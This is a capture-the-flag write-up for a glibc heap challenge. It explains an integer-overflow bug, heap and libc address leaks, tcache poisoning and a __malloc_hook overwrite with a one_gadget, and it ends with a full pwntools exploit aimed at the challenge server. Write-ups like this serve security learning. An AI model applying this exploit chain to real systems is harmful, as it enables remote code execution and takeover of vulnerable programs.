# Challenge Description  
We get presented with a little program that implements a heap-based array to
`char*` pointers. We can store and retrieve pointers in the array with out-of-
bounds access checks.

The main function more or less just exposes the vector's functionality in an
endless loop:  
```c  
int main()  
{  
 char name[0x10];  
 readline("Name: ", name, sizeof(name));  
 printf("Hello, %s!\n", name);

 int n = readint("n = ");  
 vector *vec = vector_new(n);  
 if (!vec)  
   return 1;

 while (1) {  
   int choice = readint("1. get\n2. set\n> ");

   switch (choice) {  
   case 1: {  
     int idx = readint("idx = ");  
     char *data = (char*)vector_get(vec, idx);  
     printf("vec.get(idx) -> %s\n", data ? data : "[undefined]");  
     break;  
   }

   case 2: {  
     int idx = readint("idx = ");  
     char *data = (char*)malloc(0x20);  
     if (!data)  
       break;  
     readline("data = ", data, 0x20);

     int result = vector_set(vec, idx, (void*)data);  
     printf("vec.set(idx, data) -> %d\n", result);  
     if (result == -1)  
       free(data);  
     break;  
   }

   default:  
     vector_delete(vec);  
     printf("Bye, %s!\n", name);  
     return 0;  
   }  
 }  
}  
```  
It is quite simple, we get to choose a name and a size. The size is used to
allocate a vector on the heap via `vector_new`.  
The vector implementation is a heap-based array to `char*` pointers. Thus it
has n "slots", where a heap allocated string pointer can be stored.

Then we enter the main loop and have 3 options:  
* 1: Read a string and store it in the vector  
* 2: Print a string from the vector  
* Anything else will free the vector and exit the program

The `vector_get` function returns the stored pointer (or `NULL`) if the index
is out of bounds:  
```c  
void* vector_get(vector *vec, int idx) {  
 if (idx < 0 || idx > vec->size)  
   return NULL;  
 return vec->elements[idx];  
}  
```  
The `vector_set` function also checks whether the index is in the bounds. If
it is, the pointer is stored. If there is already a string stored at that
location, it gets freed first before being overwritten:  
```c  
int vector_set(vector *vec, int idx, void *ptr) {  
 if (idx < 0 || idx > vec->size)  
   return -1;  
 if (vec->elements[idx])  
   free(vec->elements[idx]);  
 vec->elements[idx] = ptr;  
 return 0;  
}  
```  
# The vulnerability  
When we take a look at the `vector_new` function, we can see that it
calculates the size of the vector by hand, instead of using `calloc`  
```c  
vector *vector_new(int nmemb) {  
 if (nmemb <= 0)  
   return NULL;

 int size = sizeof(vector) + sizeof(void*) * nmemb;  
 vector *vec = (vector*)malloc(size);  
 if (!vec)  
   return NULL;

 memset(vec, 0, size);  
 vec->size = nmemb;

 return vec;  
}  
```  
This doesn't seem that bad at first, but the multiplication might overflow.
`sizeof(void*)` is 8 (2^3) for our purposes, so the multiplication is
equivalent to a left-shift by 3.  
If our input number is 1 << 29, then after multiplication the result is 1 <<
32 (Bit 33 would be set). Because an int only has 32 bits, this is equivalent
to an allocated size of 0. But the bound checks still work with our supplied
number, which is way bigger. Therefore we can set and read out of bounds with
`vector_set` and `vector_get`.  
We chose to allocate a vector of size (1 << 29) | 4, so that we still get 4 indices where it's always safe to store an element.

On a side note: `calloc` checks for overflows and returns an error instead of
allocating a block of the wrong size. That's exactly, why you should use
`calloc` in your code ;)  
# Heap address leak  
We can create a pointer to itself on the heap by allocating a chunk and
placing the pointer at index 5:

To better understand why, let's look at the heap before the allocation  
```  
0x0000559d027e42a0│+0x0000: 0x0000000020000004       <--- Our vector (Here's
the size)  
0x0000559d027e42a8│+0x0008: 0x0000000000000000       <--- Index 0  
0x0000559d027e42b0│+0x0010: 0x0000000000000000       <--- Index 1  
0x0000559d027e42b8│+0x0018: 0x0000000000000000       <--- Index 2  
0x0000559d027e42c0│+0x0020: 0x0000000000000000       <--- Index 3  
0x0000559d027e42c8│+0x0028: 0x0000000000020d41       <--- Top chunk of the
heap, next allocation will be served from here  
0x0000559d027e42d0│+0x0030: 0x0000000000000000  
0x0000559d027e42d8│+0x0038: 0x0000000000000000  
0x0000559d027e42e0│+0x0040: 0x0000000000000000  
0x0000559d027e42e8│+0x0048: 0x0000000000000000  
```  
When we malloc() the string to store in the vector, the heap looks like this:  
```  
0x0000559d027e42a0│+0x0000: 0x0000000020000004       <--- Vector size  
0x0000559d027e42a8│+0x0008: 0x0000000000000000       <--- Index 0  
0x0000559d027e42b0│+0x0010: 0x0000000000000000       <--- Index 1  
0x0000559d027e42b8│+0x0018: 0x0000000000000000       <--- Index 2  
0x0000559d027e42c0│+0x0020: 0x0000000000000000       <--- Index 3  
0x0000559d027e42c8│+0x0028: 0x0000000000000031       <--- Size of the
allocated chunk + flags (PREV_IN_USE)  
0x0000559d027e42d0│+0x0030: 0x6161616161616161       <--- Here is our data  
0x0000559d027e42d8│+0x0038: 0x6161616161616161       <--- Here is our data  
0x0000559d027e42e0│+0x0040: 0x6161616161616161       <--- Here is our data  
0x0000559d027e42e8│+0x0048: 0x0061616161616161       <--- Here is our data  
0x0000559d027e42f0│+0x0050: 0x0000000000000000        <--- Chunks are always
aligned to 0x10 boundaries, so we have some padding here  
0x0000559d027e42f8│+0x0058: 0x0000000000020d11        <--- The top chunk is
now here  
```  
Note: We can only allocate size 0x30 chunks, because the main loop requests
size 0x20 chunks and 0x20 + 0x8 (libc size data) = 0x28, which is aligned to
0x30  
Now, index 5 corresponds to the first 8-bytes of our user input. So the
pointer, which points to the allocation, is stored at the beginning of the
allocation, which creates a self-loop.

Now, we can read from this address to get the address of our that allocation.
Here's the necessary python code:  
```python  
# Allocate the buffer, with a pointer to itself in its content  
set(5, p64(0) + b'a' * 0x10)

# We can now leak the heap addr from the self-loop  
heap_base = u64(get(5).ljust(8, b'\x00')) - 0x2d0  
log.info(f"Heap base: {hex(heap_base)}")  
```

# Libc address leak  
To leak a libc address, a common technique is to get a chunk into the unsorted
bin, because then the forward and backward pointers will point to the
main_arena struct inside the struct.  
Unfortunately, this isn't as easy as it sounds, because smaller allocations
will be cached in thread caches. Sufficiently large allocations that do not
fit in the t-caches will just go in the unsorted bin and dealt with when the
next chunk is freed.

Sadly, we cannot control the size of the allocations, but we can trick glibc
into accepting a self-crafted chunk.  
We can allocate a header (I chose size 0x810 as it's a multiple of 0x30, other
sizes may work as well) like this:  
```  
0x0000557d9d3ba2f8│+0x0058: 0x0000000000000031     <-- Header of the chunk
malloc returned  
0x0000557d9d3ba300│+0x0060: 0x0000000000000000  
0x0000557d9d3ba308│+0x0068: 0x0000000000000811    <-- Header  
0x0000557d9d3ba310│+0x0070: 0x0000000000000000    <-- We need to free this
pointer (important: it's 0x10 aligned)  
0x0000557d9d3ba318│+0x0078: 0x0000000000000000  
0x0000557d9d3ba320│+0x0080: 0x0000000000000000  
```

However, when glibc tries to free the chunk, it checks the following chunk if
it's freed. If it is, then glibc can "coalesce" those chunks, that is it
merges them back together. Therefore at `0x0000557d9d3ba308+0x810`, we need a
a valid chunk header. Because I didn't want to calculate, how I need to
allocate, I just filled all allocated memory with `0x0000000000000031` (chunk
size 0x50 and `PREV_IN_USE` bit set).

Here's what the corresponding chunk next to our handcrafted chunk looks like:  
```  
0x000055adaf49fb00│+0x0000: 0x0000000000000000  
0x000055adaf49fb08│+0x0008: 0x0000000000000031    <--- Here's the size  
0x000055adaf49fb10│+0x0010: 0x0000000000000051    <--- Here are the contents
of our heap spray  
0x000055adaf49fb18│+0x0018: 0x0000000000000051  
0x000055adaf49fb20│+0x0020: 0x0000000000000051  
0x000055adaf49fb28│+0x0028: 0x0000000000000033  
0x000055adaf49fb30│+0x0030: 0x0000000000000000  
```  
As it turns out, 0x810 just alignes nicely with libc's own allocations and we
could've put anything as the contents

To free the chunk, we need to insert an address to the fake chunk on the heap.
We also want a second copy of the address to read from after freeing the
chunk. Because we know the heap start address, we can calculate the actual
addresses and store them as payload. We can then free the chunk by overwriting
one of the pointers by calculating the index where our address is stored.

The index of an address relative to the heap's start is calculated as follows:  
`(offset - 0x2a8) // 8 # 0x2a8 is the offset of index 0 from the heap's start`

We can then use our second pointer to read from the chunk in the unsorted bin,
which now looks like this:  
```  
0x0000564607e942f0│+0x0000: 0x0000000000000000  
0x0000564607e942f8│+0x0008: 0x0000000000000031     <--- Header of the "real"
chunk  
0x0000564607e94300│+0x0010: 0x0000000000000000  
0x0000564607e94308│+0x0018: 0x0000000000000811    <--- Header of our fake
chunk  
0x0000564607e94310│+0x0020: 0x00007f187890ebe0  →  0x0000564607e94b90    <---
Pointer to main_arena  
0x0000564607e94318│+0x0028: 0x00007f187890ebe0  →  0x0000564607e94b90    <---
Pointer to main_arena  
0x0000564607e94320│+0x0030: 0x0000000000000000  
0x0000564607e94328│+0x0038: 0x0000000000000000  
```

Now, keep in mind that the chunk is in the unsorted bin. This means glibc will
first serve allocations from this chunk, before consulting the top chunk. So
our next allocation will return the address `0x0000564607e94310`.  
# Arbitrary Write  
To write to arbitrary addresses, we have to trick malloc into returning a
pointer to the chosen memory location. We can do this by editing a chunk
that's already freed and point the `next` pointer of the freed chunk to our
target address.

Unfortunately, we only have allocations of a single size, therefore any freed
memory will instantly be returned when we create a new entry. We still found a
way to get multiple chunks into the t-cache.

First, we remind us about the self-loop from the heap leak. What happens when
we store a string pointer to that location? First, the new string is
allocated, then `vector_set` tries to store the pointer, but finds that there
is already a pointer stored at that location, which is subsequently freed.

The t-cache now has a reference to the former self-loop. Then, the new pointer
is written to that location, which is also the location of the `next` pointer
in the (now) freed chunk. So our payload is the next chunk, and we have full
control over this chunk's next pointer and can point it to anywhere we like.

To sum up, if we do this, the t-cache for chunks of size 0x30 will look like
this:  
```  
Tcachebins[idx=1, size=0x30] count=1  ←  Chunk(addr=0x5651d3ed02d0, size=0x30,
flags=PREV_INUSE)  ←  Chunk(addr=0x5651d3ed05b0, size=0x30, flags=PREV_INUSE)
←  Chunk(addr=0x6161616161616161, size=??????, flags=?????)  
```

Chunk `0x5651d3ed02d0` is the one we just freed. `0x5651d3ed05b0` is the one
we just allocated and `0x6161616161616161` are the first 8-byte of our
allocation. If we would call `malloc()`, it would first return
`0x5651d3ed02d0`, then `0x5651d3ed05b0` and lastly `0x6161616161616161`.

There's still a problem, though. The t-cache keeps a counter of the number of
chunks it has stored, therefore we can only remove 1 chunk, because we only
freed one of them.

This problem took me a long time to resolve. After playing around in GDB a
bit, it occured to me, that the t-cache itself is allocated on the heap and
getting it into the unsorted bin would overwrite the `count` fields of each
bin with pointers to the `main_arena`.

You can see glibc's t-cache structure in the [source
code](https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#tcache_perthread_struct).
The count for each size is stored in a single byte, which makes sense, because
a t-cache can by default only hold 7 chunks at once.

So, when we get the t-cache into the unsorted bin, the first 16 count fields
would be overwritten with addresses. But to get the chunk into the unsorted
bin, we have to fill the t-cache bins for that size beforehand.

Therefore, we free 7 chunks of size 0x290 (the size of the t-cache)
beforehand. The next chunk of size 0x290 that is freed will be put into the
unsorted bin, so we can now free the t-cache.

So our plan is:  
* Fill the t-cache of chunk size 0x290  
* Get the target location from above into the t-cache  
* Free the t-cache, to overwrite the count field of the chunk size 0x30 bin

So, now we only need to determine an address we would like to write to and the
value we would like to write. In this case overwriting `__malloc_hook` seems
easiest to get a shell as it gets called the next time `malloc()` is invoked.
We'll determine the value we need to write there in the next section. Let's
focus on the arbitrary write for now:  
```  
# fill the t-cache with size 0x290 chunks  
# We do this to get the t-cache (size 0x290) into the unsorted bin, when we'll
free it later  
offset = 0x310  
for i in range(7):  
   # create a fake chunk  
   set(0x1780 + i, p64(0) + p64(0x291) + b'free')  
   # free our handcrafted chunk  
   set(get_idx(offset + 0x30), p64(heap_base + offset + 0x10))  
   offset += 0x60

# Create a fake t-cache chunk  
# Index 5 is the self-loop from the heap leak, therefore the chunk gets freed
and the next pointer overwritten to our just allocated payload  
# We control the t-cache chunk's next pointer and set it to __malloc_hook  
# The t-cache then looks like this:  
#  
# size 0x30 [count=1]: Chunk(heap_base + 0x2d0) -> Chunk(heap_base + 0xbd0 + 7
* 0x60) -> Chunk(libc.sym['__malloc_hook'])  
# size 0x290 [count=7]: <not important, just notice that it's full (count=7)>  
#  
# If we call malloc 3 times, we get returned a pointer to '__malloc_hook'  
# However we cannot call malloc() 3-times, because the t-cache counts the
number of elements in the bin and that count is 1 currently  
# So we'll overwrite that value in the next step  
set(5, p64(libc.sym['__malloc_hook']) + p64(heap_base + 0x10))  
log.info("Added chunks to t-cache")

# free the t-cache itself  
# This will overwrite the count in the t-cache with pointers to the main arena
as this chunk is put into the unsorted bin  
# Now the chances are good that the byte that counts the number of 0x30 chunks
in the t-cache is > 3  
set(5, p64(heap_base + 0x10))

# Discard one chunk to get to the '__malloc_hook'. We already got one removed
by the malloc that happened when freeing the t-cache  
set(2, b'finally')  
# Overwrite '__malloc_hook' with our one_gadget location  
# We see in gdb that r15 and rdx are NULL, therefore the constraints are
fulfilled  
set(3, p64(libc.address + 0xe6c81))  # one_gadget  
```

# Pop a shell  
We can overwrite the `_malloc_hook` now, but what value would give us a shell?
A libc has the ability to invoke a program with the `system()` function. We
can hijack the control flow of this mechanism to pop us a shell. Luckily, we
do not need to figure this out by hand. There's a tool called
[one_gadget](https://github.com/david942j/one_gadget), which calculates this
address in a given libc.

When we invoke `one_gadget` on the given libc, we get this:  
```  
~/ctf/2021/asis/strvec$ one_gadget libc-2.31.so  
0xe6c7e execve("/bin/sh", r15, r12)  
constraints:  
 [r15] == NULL || r15 == NULL  
 [r12] == NULL || r12 == NULL

0xe6c81 execve("/bin/sh", r15, rdx)  
constraints:  
 [r15] == NULL || r15 == NULL  
 [rdx] == NULL || rdx == NULL

0xe6c84 execve("/bin/sh", rsi, rdx)  
constraints:  
 [rsi] == NULL || rsi == NULL  
 [rdx] == NULL || rdx == NULL  
```  
By setting a break point in GDB to the malloc of the main loop, we can check
which constraints are fulfilled. We see that `r15` and `rdx` are `NULL` and
therefore we can write `libc_base + 0xe6c81` to the `__malloc_hook`.

Now we can just call the `set` option in the main menu. The program will try
to allocate a chunk, but because we have overwritten `__malloc_hook`, the
one_gadget will be executed and pop us a shell.

Now we can `cat flag*` and get those sweet CTF points  
# Putting it all together  
Here's the complete exploit:  
```python  
#!/usr/bin/env python3  
from pwn import *

# Set up pwntools for the correct architecture  
context.update(arch='amd64')

exe_file = './strvec'  
custom_libc = 'libc-2.31.so'

host = '168.119.108.148'  
port = 12010

binary = ELF(exe_file)  
if custom_libc:  
   libc = ELF(custom_libc)

def start(argv=[]):  
   '''Start the exploit against the target.'''  
   if args.GDB:  
       return gdb.debug([exe_file] + argv,  
                        gdbscript=gdbscript)  
   elif args.REMOTE:  
       return remote(host, port)  
   else:  
       return process([exe_file] + argv)

# Specify your GDB script here for debugging  
# GDB will be launched if the exploit is run via e.g.  
# ./exploit.py GDB  
gdbscript = '''  
'''

# ===========================================================  
#                     EXPLOIT GOES HERE  
# ===========================================================

def get(idx):  
   io.recvuntil('> ')  
   io.sendline('1')  
   io.sendline(str(idx))  
   io.recvuntil('vec.get(idx) -> ')  
   data = io.recvline()  
   return data[:-1]

def set(idx, data, check=True):  
   io.recvuntil('> ')  
   io.sendline('2')  
   io.sendline(str(idx))  
   io.sendline(data)  
   if check:  
       io.recvuntil('vec.set(idx, data) -> ')  
       data = io.recvline()  
       assert int(data.decode().strip()) == 0

def delete():  
   io.recvuntil('> ')  
   io.sendline('3')  
   io.recvline()

io = start()  
io.recvuntil('Name: ')  
io.sendline('H4x0r')  
io.recvuntil('n =')  
io.sendline(str(1 << 29 | 4))  # Multiplication overflows and we get a vector of size 4

def get_idx(offset):  
   return (offset - 0x2a8) // 8  # elements[0] is at heap_base + 0x2a8

try:  
   # -------------------------------- #  
   # --         Heap leak          -- #  
   # -------------------------------- #

   # Allocate the buffer, with a pointer to itself in its content  
   set(5, p64(0) + b'a' * 0x10)

   # We can now leak the heap addr from the self-loop  
   heap_base = u64(get(5).ljust(8, b'\x00')) - 0x2d0  
log.info(f"Heap base: {hex(heap_base)}")

   # -------------------------------- #  
   # --         Libc leak          -- #  
   # -------------------------------- #

   # Create a fake chunk (must be aligned to 0x10)  
   # It must be big enough to be inserted into a unsorted bin >= 0x800  
   fake_chunk = p64(0x0) + p64(0x811) + p64(0) + p64(0)  
   set(1, fake_chunk[:30])

   # The next chunk must have the prev in use bit set or free tries to
coalesce the chunks  
   # Too lazy to calculate the address, so heap spray it is ;)  
   offset = 1  
   while (offset * 0x30 <= 0x810):  
       offset += 1  
       set(0x1700 + offset, (p64(0x51) + p64(0x51) + p64(0x51) + p64(51))[:30])  
   # Drop a second pointer to the unsorted chunk, so we can read it later  
   offset += 1  
   set(0x1700 + offset, p64(heap_base + 0x310) + b'e' * 0x10)

   # free the unsorted chunk  
   set(get_idx(0x300 + offset * 0x30), p64(heap_base + 0x310) + b'f' * 0x10)

   # Leak a libc base address from the unsorted chunks next pointer  
   libc.address = u64(get(get_idx(0x300 + (offset - 1) * 0x30)).ljust(8,
b'\x00')) - 0x1ebbe0  
log.info(f"Libc base: {hex(libc.address)}")

   # -------------------------------- #  
   # --      Arbitrary write       -- #  
   # -------------------------------- #

   # fill the t-cache with size 0x290 chunks  
   # We do this to get the t-cache (size 0x290) into the unsorted bin, when
we'll free it later  
   offset = 0x310  
   for i in range(7):  
       # create a fake chunk  
       set(0x1780 + i, p64(0) + p64(0x291) + b'free')  
       # free our handcrafted chunk  
       set(get_idx(offset + 0x30), p64(heap_base + offset + 0x10))  
       offset += 0x60

   # Create a fake t-cache chunk  
   # Index 5 is the self-loop from the heap leak, therefore the chunk gets
freed and the next pointer overwritten to our just allocated payload  
   # We control the t-cache chunk's next pointer and set it to __malloc_hook  
   # The t-cache then looks like this:  
   #  
   # size 0x30 [count=1]: Chunk(heap_base + 0x2d0) -> Chunk(heap_base + 0xbd0
+ 7 * 0x60) -> Chunk(libc.sym['__malloc_hook'])  
   # size 0x290 [count=7]: <not important, just notice that it's full
(count=7)>  
   #  
   # If we call malloc 3 times, we get returned a pointer to '__malloc_hook'  
   # However we cannot call malloc() 3-times, because the t-cache counts the
number of elements in the bin and that count is 1 currently  
   # So we'll overwrite that value in the next step  
   set(5, p64(libc.sym['__malloc_hook']) + p64(heap_base + 0x10))  
log.info("Added chunks to t-cache")

   # free the t-cache itself  
   # This will overwrite the count in the t-cache with pointers to the main
arena as this chunk is put into the unsorted bin  
   # Now the chances are good that the byte that counts the number of 0x30
chunks in the t-cache is > 3  
   set(5, p64(heap_base + 0x10))

   # Discard one chunk to get to the '__malloc_hook'. We already got one
removed by the malloc that happened when freeing the t-cache  
   set(2, b'finally')  
   # Overwrite '__malloc_hook' with our one_gadget location  
   # We see in gdb that r15 and rdx are NULL, therefore the constraints are
fulfilled  
   set(3, p64(libc.address + 0xe6c81))  # one_gadget

   # -------------------------------- #  
   # --        Pop a shell         -- #  
   # -------------------------------- #

   set(-1, '', False)  # malloc(0x20) calls one_gadget  
except EOFError:  
   pass

io.interactive()  
```